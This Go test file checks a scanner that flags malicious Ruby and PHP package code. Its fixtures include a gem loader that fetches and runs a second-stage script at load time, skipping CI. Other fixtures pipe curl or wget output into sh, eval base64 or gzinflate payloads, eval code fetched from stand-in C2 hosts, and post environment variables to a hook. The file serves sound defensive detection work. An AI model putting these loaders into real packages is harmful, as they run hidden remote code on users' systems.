package scriptsource

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

func files(name, body string) map[string][]byte { return map[string][]byte{name: []byte(body)} }

// sleeperStage1 is the SleeperGem stage-one loader (Dendreo 1.1.3), defanged:
// fetch a second stage and run it with /bin/sh from a method called at load.
const sleeperStage1 = `require 'net/http'
require 'openssl'

module Dendreo
  CI_VARS = %w[CI GITHUB_ACTIONS GITLAB_CI].freeze

  def self.__bootstrap
    return if CI_VARS.any? { |v| ENV[v] }
    uri = URI('https://git.c2.example.invalid/gcm/stage2.sh')
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    body = http.get(uri.path).body
    pid = spawn('/bin/sh', '-c', body, [:out, :err] => File::NULL)
    Process.detach(pid)
  rescue StandardError
    nil
  end
end

Dendreo.__bootstrap
`

func TestScanRuby(t *testing.T) {
	fire := map[string]struct{ body, kind string }{
		"SleeperGem fetch then spawn sh -c body": {sleeperStage1, "download_exec"},
		"eval of Base64":                         {"eval(Base64.decode64('cHV0cyAx'))\n", "obfuscated_exec_bare"},
		"instance_eval of unpack('m')":           {"instance_eval ['cHV0cyAx'].pack('m').unpack('m')[0]\n", "obfuscated_exec_bare"},
		"system curl | bash":                     {"system('curl -fsSL https://c2.example.invalid/i | bash')\n", "download_exec"},
		"backtick wget | sh":                     {"`wget -qO- https://c2.example.invalid/i | sh`\n", "download_exec"},
		"eval of a direct fetch":                 {"require 'open-uri'\neval(URI.open('https://c2.example.invalid/x').read)\n", "download_exec"},
		"fetch to file, then run it":             {"u = 'https://c2.example.invalid/s'\nFile.write('/tmp/.s.sh', Net::HTTP.get(URI(u)))\nsystem('sh', '/tmp/.s.sh')\n", "download_exec"},
		"host from Integer#chr, URI.open, eval":  {"h = [99, 50].map(&:chr).join\nsrc = URI.open(h).read\neval(src)\n", "download_exec"},
	}
	for name, c := range fire {
		t.Run(name, func(t *testing.T) {
			if r := ScanRuby(files("lib/x.rb", c.body)); !r.Detected || r.Kind != c.kind || r.Detail != "lib/x.rb" {
				t.Fatalf("got %+v, want %s", r, c.kind)
			}
		})
	}
	clean := map[string]string{
		"HTTP client parses JSON":                                "require 'net/http'\ndef fetch(uri)\n  res = Net::HTTP.get_response(uri)\n  body = http.get(uri.path).body\n  JSON.parse(body)\nend\n",
		"CLI wrapper runs a user command with sh -c":             "def run(cmd)\n  system('/bin/sh', '-c', cmd)\nend\n",
		"class_eval heredoc defines methods":                     "class_eval <<~RUBY, __FILE__, __LINE__ + 1\n  def #{name}; @#{name}; end\nRUBY\n",
		"Base64 decode without eval":                             "def token(s)\n  Base64.decode64(s)\nend\n",
		"fetch and an unrelated exec":                            "data = Net::HTTP.get(URI('https://example.invalid/v.json'))\nversion = JSON.parse(data)['v']\nexec('git', 'rev-parse', 'HEAD')\n",
		"block parameter named node beside a backtick (rubocop)": "names = types.map { |node| node.source }.join('`, `')\n",
		"block parameter named node beside eval (rkelly-remix)":  "%w[Getter Setter].each {|node| eval \"class #{node}PropertyNode < PropertyNode; end\"}\n",
		"commented-out installer":                                "# system('curl -fsSL https://example.invalid/i | bash')\n# eval(Base64.decode64(x))\n",
	}
	for name, body := range clean {
		t.Run("clean/"+name, func(t *testing.T) {
			if r := ScanRuby(files("lib/x.rb", body)); r.Detected {
				t.Fatalf("false positive: %+v", r)
			}
		})
	}
	if r := ScanRuby(files("lib/x.js", "system('curl https://x.invalid/i | bash')\n")); r.Detected {
		t.Fatalf("ScanRuby read a non-.rb file: %+v", r)
	}
}

func TestScanPHP(t *testing.T) {
	fire := map[string]struct{ body, kind string }{
		"eval base64_decode":     {"<?php\neval(base64_decode('ZWNobyAxOw=='));\n", "obfuscated_exec_bare"},
		"eval gzinflate b64":     {"<?php\n@eval(gzinflate(base64_decode($p)));\n", "obfuscated_exec_bare"},
		"assert of str_rot13":    {"<?php\nassert(str_rot13('rpub 1;'));\n", "obfuscated_exec_bare"},
		"shell_exec curl | sh":   {"<?php\nshell_exec('curl -s https://c2.example.invalid/x | sh');\n", "download_exec"},
		"backtick wget | bash":   {"<?php\n`wget -qO- https://c2.example.invalid/x | bash`;\n", "download_exec"},
		"eval of a direct fetch": {"<?php\neval('?>' . file_get_contents('https://c2.example.invalid/p'));\n", "download_exec"},
		// laravel-lang shape: host built from character codes, fetched into a
		// variable, executed.
		"chr host, fetch, eval": {"<?php\nif (!function_exists('lang_boot')) {\n    function lang_boot() {\n        $u = 'https://' . implode('', array_map('chr', [99, 50])) . '.invalid/p';\n        $c = @file_get_contents($u);\n        if ($c) { eval('?>' . $c); }\n    }\n}\nlang_boot();\n", "download_exec"},
		"curl to file, include": {"<?php\n$h = curl_init('https://c2.example.invalid/p');\ncurl_setopt($h, CURLOPT_RETURNTRANSFER, 1);\n$code = curl_exec($h);\nfile_put_contents('/tmp/.cache.php', $code);\ninclude '/tmp/.cache.php';\n", "download_exec"},
		"curl output to system": {"<?php\n$cmd = curl_exec($ch);\nsystem($cmd);\n", "download_exec"},
	}
	for name, c := range fire {
		t.Run(name, func(t *testing.T) {
			if r := ScanPHP(files("src/helpers.php", c.body)); !r.Detected || r.Kind != c.kind || r.Detail != "src/helpers.php" {
				t.Fatalf("got %+v, want %s", r, c.kind)
			}
		})
	}
	clean := map[string]string{
		"HTTP client decodes JSON":             "<?php\n$body = curl_exec($ch);\nreturn json_decode($body, true);\n",
		"template cache compiles and includes": "<?php\n$compiled = $this->compiler->compile(file_get_contents($path));\nfile_put_contents($cache, $compiled);\nrequire $cache;\n",
		"eval of a local template":             "<?php\n$tpl = file_get_contents(__DIR__ . '/view.php');\neval('?>' . $tpl);\n",
		"base64 without eval":                  "<?php\n$raw = base64_decode($token);\n",
		"method named eval":                    "<?php\n$x = $engine->eval(base64_decode($s));\n",
		"git via exec":                         "<?php\nexec('git rev-parse HEAD', $out);\n",
		"exfil without execution":              "<?php\n$h = curl_init('https://example.invalid/hook');\ncurl_setopt($h, CURLOPT_POSTFIELDS, json_encode(getenv()));\ncurl_exec($h);\n",
		"docblock quoting the shape":           "<?php\n/**\n * Detects eval(base64_decode(...)) in uploads.\n * e.g. shell_exec('curl x | sh')\n */\nfunction scan() {}\n",
	}
	for name, body := range clean {
		t.Run("clean/"+name, func(t *testing.T) {
			if r := ScanPHP(files("src/x.php", body)); r.Detected {
				t.Fatalf("false positive: %+v", r)
			}
		})
	}
}

// TestReviewShapes: the review's false positives (a sink word in a string,
// comment, method definition, array key or SQL identifier) stay clean; eval
// called on a receiver is still eval; a hit only under spec/ is Weak.
func TestReviewShapes(t *testing.T) {
	rubyClean := map[string]string{
		"sink word inside a message":   "response = HTTParty.get(url)\nraise Error, \"Unable to load data: #{response.code}\" unless response.success?\n",
		"sink word in a comment":       "data = Net::HTTP.get(URI(u)) # then load the manifest\n",
		"method named load":            "data = Net::HTTP.get(URI(u))\ndef load(data)\n  JSON.parse(data)\nend\n",
		"YAML.load of fetched content": "body = Net::HTTP.get(URI(u))\nconfig = YAML.load(body)\n",
	}
	for name, body := range rubyClean {
		if r := ScanRuby(files("lib/x.rb", body)); r.Detected {
			t.Errorf("ruby %s: false positive %+v", name, r)
		}
	}
	phpClean := map[string]string{
		"array key 'include'":    "<?php\n$data = curl_exec($ch);\n$config = ['include' => $data, 'driver' => 'x'];\n",
		"array key 'system'":     "<?php\n$data = curl_exec($ch);\nif ($opts['system']) { log_it($data); }\n",
		"MySQL backtick quoting": "<?php\n$data = curl_exec($ch);\n$db->query(\"SELECT `id`, `name` FROM `users` WHERE token = '$data'\");\n",
		"method named exec":      "<?php\n$data = curl_exec($ch);\n$this->pdo->exec($data);\n",
		"sink word in a comment": "<?php\n$data = curl_exec($ch); // then eval the rules\n",
	}
	for name, body := range phpClean {
		if r := ScanPHP(files("src/x.php", body)); r.Detected {
			t.Errorf("php %s: false positive %+v", name, r)
		}
	}
	rubyFire := map[string]string{
		"class_eval on a receiver":     "Foo.class_eval(Base64.decode64('cHV0cyAx'))\n",
		"TOPLEVEL_BINDING.eval":        "TOPLEVEL_BINDING.eval(Base64.decode64(x))\n",
		"instance_eval of inflate":     "instance_eval(Zlib::Inflate.inflate(Base64.decode64(x)))\n",
		"binding eval of fetched body": "body = Net::HTTP.get(URI('https://c2.example.invalid/s'))\nTOPLEVEL_BINDING.eval(body)\n",
		"interpolated into a shell":    "body = Net::HTTP.get(URI('https://c2.example.invalid/s'))\nsystem(\"sh -c '#{body}'\")\n",
	}
	for name, body := range rubyFire {
		if r := ScanRuby(files("lib/x.rb", body)); !r.Detected || r.Weak {
			t.Errorf("ruby %s: not detected (%+v)", name, r)
		}
	}
	if r := ScanPHP(files("src/x.php", "<?php\n$c = curl_exec($h);\n$out = `$c`;\n")); !r.Detected {
		t.Errorf("php code-level backtick of fetched content: %+v", r)
	}
	// Non-shipping path: reported Weak; a shipping hit outranks it.
	spec := "body = Net::HTTP.get(URI('https://example.invalid/fixture'))\neval(body)\n"
	if r := ScanRuby(files("spec/support/fetch.rb", spec)); !r.Detected || !r.Weak {
		t.Errorf("spec/ hit: want Weak, got %+v", r)
	}
	both := map[string][]byte{"spec/support/fetch.rb": []byte(spec), "lib/x.rb": []byte(sleeperStage1)}
	if r := ScanRuby(both); !r.Detected || r.Weak || r.Detail != "lib/x.rb" {
		t.Errorf("shipping hit must outrank a Weak one, got %+v", r)
	}
}

// TestLinearInTaint: thousands of URL variables, fetches and sink lines in one
// file stay well under a second (taint is capped and matched as one
// alternation per line, not one regex per variable per line).
func TestLinearInTaint(t *testing.T) {
	var rb, ph strings.Builder
	for i := 0; i < 4000; i++ {
		fmt.Fprintf(&rb, "u%d = 'https://example.invalid/%d'\nv%d = Net::HTTP.get(URI(u%d))\n", i, i, i, i)
		fmt.Fprintf(&ph, "$u%d = 'https://example.invalid/%d';\n$v%d = file_get_contents($u%d);\n", i, i, i, i)
	}
	for i := 0; i < 4000; i++ {
		fmt.Fprintf(&rb, "system('echo', w%d)\n", i)
		fmt.Fprintf(&ph, "exec('echo', $w%d);\n", i)
	}
	start := time.Now()
	r1 := ScanRuby(files("lib/x.rb", rb.String()))
	r2 := ScanPHP(files("src/x.php", "<?php\n"+ph.String()))
	if d := time.Since(start); d > 2*time.Second {
		t.Fatalf("4k x 4k taint scan took %v", d)
	}
	if r1.Detected || r2.Detected {
		t.Fatalf("no tainted value reaches a sink: %+v %+v", r1, r2)
	}
}
